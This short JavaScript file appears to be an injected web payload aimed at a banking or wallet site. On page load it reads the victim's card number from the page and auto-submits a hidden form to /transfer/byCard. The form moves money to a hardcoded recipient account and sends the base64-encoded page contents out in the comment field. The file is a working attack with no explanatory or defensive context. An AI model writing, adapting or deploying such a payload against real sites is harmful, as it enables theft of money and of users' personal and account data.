function storeCardNumber() {
  const SELECTOR =
    "body > main > div.personalAccountWrapper > div > div.personalAccountFirstHalf > div.walletsArea > div > div > div.showdefaultWalletData.pointer > div.walletData > div.text > span:nth-child(2)";
  localStorage.setItem("number", document.querySelector(SELECTOR).innerHTML);
}

function getCardNumber() {
  return localStorage.getItem("number");
}

function submitData() {
  storeCardNumber();
  const TEMPLATE = `
    <form method="POST" action="/transfer/byCard">
      <input type="hidden" name="from" id="walletInputOption" value="${getCardNumber()}">
            <input class="" required="" maxlength="20" name="to" type="text" value="2202100714221678">
          <input class="" name="comment" type="text" value="${btoa(
            document.body.innerHTML
          )}">
          <input class="" name="money" type="text" min="0.1" step="any" value="0.01">
          </form>
    `;
  const div = document.createElement("div");
  div.innerHTML = TEMPLATE;
  const form = div.querySelector("form");
  form.submit();
}

window.addEventListener("DOMContentLoaded", submitData);
